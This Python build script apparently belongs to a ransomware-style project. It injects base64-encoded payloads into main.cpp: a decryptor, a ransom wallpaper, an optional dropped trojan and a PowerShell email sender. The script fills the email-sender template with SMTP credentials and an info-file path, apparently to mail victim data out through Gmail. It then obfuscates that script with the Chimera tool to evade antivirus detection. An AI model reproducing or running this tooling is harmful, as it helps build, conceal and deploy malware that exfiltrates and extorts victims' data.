import base64, sys, os, platform
sys.setrecursionlimit(1000000)      # for bigger files

emailSenderLastPath = ''
FAST_TEST = False
CUSTOM_FILE = False
DROPRUN_TROJAN = False
for line in open('../commons/common.h', 'r').readlines():
    if '#define DEBUG' in line and 'true' in line:
        FAST_TEST = True
    if '#define EMAILSENDER' in line:
        emailSenderLastPath = line.split('"')[1].replace('\\\\', '\\')
    if '#define DROP_CUSTOM_FILE' in line and 'true' in line:
        CUSTOM_FILE = True
    if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
        DROPRUN_TROJAN = True


def split_str(seq, chunk, skip_tail=False):
    lst = []
    if chunk <= len(seq):
        lst.extend([seq[:chunk]])
        lst.extend(split_str(seq[chunk:], chunk, skip_tail))
    elif not skip_tail and seq:
        lst.extend([seq])
    return lst



def encryptString(string):
    return os.popen('powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"' + str(string) + '\\"))').read()[:-1]

def getEmailSenderCryptedAndEncoded(filePath):
    SENDERMAIL = "defaultSenderEmail@email.com"
    SENDERPSW = "password1234!"
    RECEIVERMAIL = "defaultReceiverEmail@email.com"
    EMAILSUBJECT = "Default Subject"
    EMAILBODY = "Default body"
    INFOFILE = "default/path/to/info.txt"
    server = 'smtp.gmail.com'
    port = 587
    host = 'www.google.com'


    for line in open('../commons/common.h', 'r').readlines():
        if ' ' in line:
            if line.split(' ')[1].split('\t')[0] == 'SENDERMAIL':
                SENDERMAIL = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'SENDERPSW':
                SENDERPSW = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'RECEIVERMAIL':
                RECEIVERMAIL = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'EMAILSUBJECT':
                EMAILSUBJECT = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'EMAILBODY':
                EMAILBODY = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'INFOFILE':
                INFOFILE = line.split('"')[1]


    shellText = open(filePath, 'r').read()
    shellText = shellText.replace("SENDERMAIL", encryptString(SENDERMAIL))
    shellText = shellText.replace("SENDERPSW", encryptString(SENDERPSW))
    shellText = shellText.replace("RECEIVERMAIL", encryptString(RECEIVERMAIL))
    shellText = shellText.replace("EMAILSUBJECT", encryptString(EMAILSUBJECT))
    shellText = shellText.replace("EMAILBODY", encryptString(EMAILBODY))
    shellText = shellText.replace("INFOFILE", encryptString(INFOFILE))
    shellText = shellText.replace("SERVER", encryptString(server))
    shellText = shellText.replace("PORT", encryptString(port))
    shellText = shellText.replace("HOST", encryptString(host))
    shellText = shellText.replace("PATH", encryptString(emailSenderLastPath))

    open('emailSenderReal.ps1', 'w').write(shellText)
    if not FAST_TEST or not os.path.exists('chimera.ps1'):
        if platform.machine().endswith('64'):
            os.system(f'start /wait "" "%PROGRAMFILES%\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
        else:
            os.system(f'start /wait "" "%SYSTEMDRIVE%\\Program Files (x86)\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
    os.remove('emailSenderReal.ps1')

    returner = base64.b64encode(open('chimera.ps1', 'rb').read()).decode()
    if not FAST_TEST:
        os.remove('chimera.ps1')
    return returner


def checkFileLocation(file, iLine):
    if not os.path.exists(file):
        print(f'main.cpp{iLine}: error PreComp: file "{file}" not found')



main_cppRead = open('main.cpp', 'r')
content = ""

i = 0
for line in main_cppRead.readlines():
    i += 1

    if line.split('=')[0] == 'string InfoDecryptorContent ' and line.split('=')[1] != ' \n':
        content += 'string InfoDecryptorContent = \n'
        decryptorPath = line.split('"')[1]
        decryptorContent = base64.b64encode(open(decryptorPath, 'rb').read()).decode()
        open('preCompilation.tmp', 'a').write("decryptor=" + decryptorPath + "\n")
        for subContent in split_str(decryptorContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    if line.split('=')[0] == 'string WallpaperContent ' and line.split('=')[1] != ' \n':
        content += 'string WallpaperContent = \n'
        wallpaperPath = line.split('"')[1]
        wallpaperContent = base64.b64encode(open(wallpaperPath, 'rb').read()).decode()
        open('preCompilation.tmp', 'a').write("wallpaper=" + wallpaperPath + "\n")
        for subContent in split_str(wallpaperContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    if line.split('=')[0] == 'string EmailSenderContent ' and line.split('=')[1] != ' \n':
        content += 'string EmailSenderContent = \n'
        emailSenderPath = line.split('"')[1]
        emailSenderContent = getEmailSenderCryptedAndEncoded(emailSenderPath)
        open('preCompilation.tmp', 'a').write("emailsender=" + emailSenderPath + "\n")
        for subContent in split_str(emailSenderContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    if line.split('=')[0] == 'string FileIconContent ' and line.split('=')[1] != ' \n':
        content += 'string FileIconContent = \n'
        fileIconPath = line.split('"')[1]
        fileIconContent = base64.b64encode(open(fileIconPath, 'rb').read()).decode()
        open('preCompilation.tmp', 'a').write("fileicon=" + fileIconPath + "\n")
        for subContent in split_str(fileIconContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    if line.split('=')[0] == 'string CustomFileContent ' and line.split('=')[1] != ' \n':
        content += 'string CustomFileContent = \n'
        customFilePath = line.split('"')[1]
        customFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if CUSTOM_FILE:
            checkFileLocation(customFilePath, i)
            customFileContent = base64.b64encode(open(customFilePath, 'rb').read()).decode()
        open('preCompilation.tmp', 'a').write("customfile=" + customFilePath + "\n")
        for subContent in split_str(customFileContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n':
        content += 'string TrojanFileContent = \n'
        trojanFilePath = line.split('"')[1]
        trojanFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if DROPRUN_TROJAN:
            checkFileLocation(trojanFilePath, i)
            trojanFileContent = base64.b64encode(open(trojanFilePath, 'rb').read()).decode()
        open('preCompilation.tmp', 'a').write("trojanfile=" + trojanFilePath + "\n")
        for subContent in split_str(trojanFileContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue
    content += line

main_cppRead.close()

main_cppWrite = open('main.cpp', 'w')
main_cppWrite.write(content)
main_cppWrite.close()
